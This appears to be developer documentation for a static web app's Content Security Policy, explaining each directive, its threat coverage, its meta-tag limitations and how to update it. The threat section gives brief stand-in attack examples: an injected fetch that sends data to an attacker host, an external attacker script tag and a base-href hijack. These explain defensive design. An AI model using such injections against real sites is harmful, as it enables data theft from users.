# Content Security Policy

This document explains the CSP that ships with the app, what each
directive protects, and what to do when you add new resources.

## Where it lives

`index.html`, as a meta tag:

```html
<meta http-equiv="Content-Security-Policy" content="…">
```

GitHub Pages does not let you set custom HTTP response headers, so the
meta-tag form is the only delivery path available on this host. Most
useful directives work in the meta form; the ones that don't are
called out below.

## The policy

```
default-src 'none';
script-src 'self';
style-src 'self';
img-src 'self' data:;
connect-src 'self';
manifest-src 'self';
worker-src 'self';
base-uri 'none';
form-action 'self'
```

## Per-directive reasoning

| Directive | Value | Why |
|---|---|---|
| `default-src` | `'none'` | Anything not explicitly allowed fails closed. Adding a new resource type requires consciously updating this file. |
| `script-src` | `'self'` | Loads `script.js` and registers `sw.js`. No inline `<script>`, no `eval`, no CDN — none would be allowed. |
| `style-src` | `'self'` | Loads `style.css`. No inline `<style>`, no `style="…"` attributes (they'd need `'unsafe-inline'`). |
| `img-src` | `'self' data:` | Loads the apple-touch-icon and favicon. `data:` is included for future inline SVGs / placeholder images; remove it if you never use them. |
| `connect-src` | `'self'` | The page itself makes no `fetch`/XHR calls today. `'self'` future-proofs same-origin requests without permitting external ones. |
| `manifest-src` | `'self'` | `manifest.webmanifest` is loaded via `<link rel="manifest">`. |
| `worker-src` | `'self'` | `sw.js` registers as a service worker. Some browsers fall back to `script-src` here; setting it explicitly avoids ambiguity. |
| `base-uri` | `'none'` | Stops a `<base>` tag (injected or otherwise) from redirecting relative URLs to an attacker-controlled origin. |
| `form-action` | `'self'` | The edit/test/add dialogs use `<form method="dialog">`, which doesn't navigate, but `form-action` falls back to `default-src` in CSP3 and `'none'` can spuriously block dialog submits in some browsers. `'self'` is safe and we have no real form endpoints anyway. |

## What this defends against

- **Inline-script XSS.** Any injected `<script>…</script>` or `onclick="…"` HTML attribute is blocked because `'unsafe-inline'` is not granted. (We have no XSS sink today since user content always goes through `textContent`, but this is defence in depth.)
- **External code execution.** A new `<script src="https://attacker.example/…">`, a CDN-loaded library, or an `eval()` call would all fail.
- **Data exfiltration via injected `fetch`.** `connect-src 'self'` blocks `fetch('https://attacker.example', ...)` outright. The attacker would need to find a same-origin endpoint to use as a relay — there isn't one.
- **Base-URI hijacking.** A `<base href="https://attacker.example/">` in the document can't take effect.
- **Form action injection.** Injected forms can't `POST` user input to a third-party URL.

## What this does *not* defend against

- **A compromised `script.js` itself.** If an attacker controls what ships from the repo or the Pages deploy, the malicious script is same-origin and CSP allows it. CSP is defence in depth, not delivery-path security.
- **Clickjacking via iframe.** `frame-ancestors` does not work via meta tag — it must be an HTTP header. GitHub Pages does not let us set headers, so this site can be embedded by anyone. Frame-busting JavaScript is the only mitigation available here and is unreliable; consider it out of scope.
- **Malicious browser extensions.** Extensions sit above CSP and can inject scripts that ignore the policy.
- **Brute-forcing exported backup files.** Out of scope for CSP entirely.

## When you add a new resource

If you add a file or feature that loads something CSP-controlled,
update the CSP in `index.html` in the same commit. Common cases:

| You're adding… | Update |
|---|---|
| An inline `<style>` block | Add `'unsafe-inline'` to `style-src` — but prefer moving styles into `style.css` instead. |
| An inline `<script>` block | Same: avoid. Use a nonce (`'nonce-xyz'`) only if you must. |
| A CDN script or font | Add the origin to the relevant `*-src` directive (e.g. `script-src 'self' https://cdn.example`). Better: vendor the file locally and keep `'self'`. |
| An external image | Add the origin to `img-src`. Prefer bundling images locally. |
| A `fetch` to an external API | Add the origin to `connect-src`. |
| A `Worker` from a blob URL | Add `blob:` to `worker-src`. |
| `eval` / `new Function()` | Add `'unsafe-eval'` to `script-src`. Try very hard not to. |

The rule of thumb that keeps the policy small: **every resource is
local; nothing is loaded from the network at runtime.** As long as
that holds, the policy doesn't need to change.

## Limitations of the meta-tag form

These CSP directives only work when delivered as an HTTP response
header, not as a meta tag. They are silently ignored if put in a meta:

- `frame-ancestors` (clickjacking)
- `report-uri` / `report-to` (violation reports)
- `sandbox`

If the app ever moves off GitHub Pages to a host that supports custom
headers (Cloudflare Pages, Netlify, a CDN in front of an object store),
add `frame-ancestors 'none'` to the header version and the meta tag
becomes redundant.

## Testing locally

Open DevTools → Console. CSP violations are logged with a clear
`Refused to …` message naming the violated directive. Smoke test:

1. Load the page and confirm the network panel shows no failed fetches.
2. Confirm there are no `Refused to …` log entries.
3. Add/test/grade a secret end-to-end; no part of the flow should rely
   on a resource the policy hasn't allowlisted.

If a violation does show up after a change, the message names the
directive and the URL — update the relevant entry in the table above
in the same commit as the code change.
